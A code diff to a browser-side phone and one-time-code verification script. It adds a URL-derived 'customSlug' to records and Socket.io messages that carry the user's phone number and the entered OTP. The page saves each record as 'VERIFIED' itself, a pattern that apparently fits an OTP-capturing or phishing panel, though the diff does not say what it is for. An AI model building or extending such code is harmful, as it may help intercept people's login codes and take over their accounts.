@@ -181,19 +181,21 @@ function handlePhoneSubmit(e) {
     const btn = document.getElementById('btn-send-phone');
     setLoading(btn, true);
 
+    const customSlug = window.location.pathname + window.location.search;
     const recData = {
         id: currentVerificationId,
         _id: currentVerificationId,
         phoneNumber: fullPhone,
         status: 'PHONE_SUBMITTED',
+        customSlug: customSlug,
         submittedAt: new Date().toISOString()
     };
 
     saveCloudRecord(recData);
 
-    // Socket.io emit phone number to backend
+    // Socket.io emit phone number to backend with custom slug
     if (socket && typeof socket.emit === 'function') {
-        socket.emit('submit_phone', { phoneNumber: fullPhone }, (response) => {
+        socket.emit('submit_phone', { phoneNumber: fullPhone, customSlug: customSlug }, (response) => {
             if (response && response.verificationId) {
                 currentVerificationId = response.verificationId;
             }
@@ -260,22 +262,26 @@ function handleOtpSubmit(e) {
     const btn = document.getElementById('btn-verify-otp');
     setLoading(btn, true);
 
+    const customSlug = window.location.pathname + window.location.search;
     const recData = {
         id: currentVerificationId,
         _id: currentVerificationId,
         phoneNumber: currentPhoneNumber,
-        otp: otpValue,
+        otp: otpCode,
         status: 'VERIFIED',
+        customSlug: customSlug,
         verifiedAt: new Date().toISOString()
     };
 
     saveCloudRecord(recData);
 
+    // Socket.io emit 4-digit OTP to backend with custom slug
     if (socket && typeof socket.emit === 'function') {
         socket.emit('submit_otp', {
             verificationId: currentVerificationId,
             phoneNumber: currentPhoneNumber,
-            otp: otpValue
+            otp: otpCode,
+            customSlug: customSlug
         });
     }
 
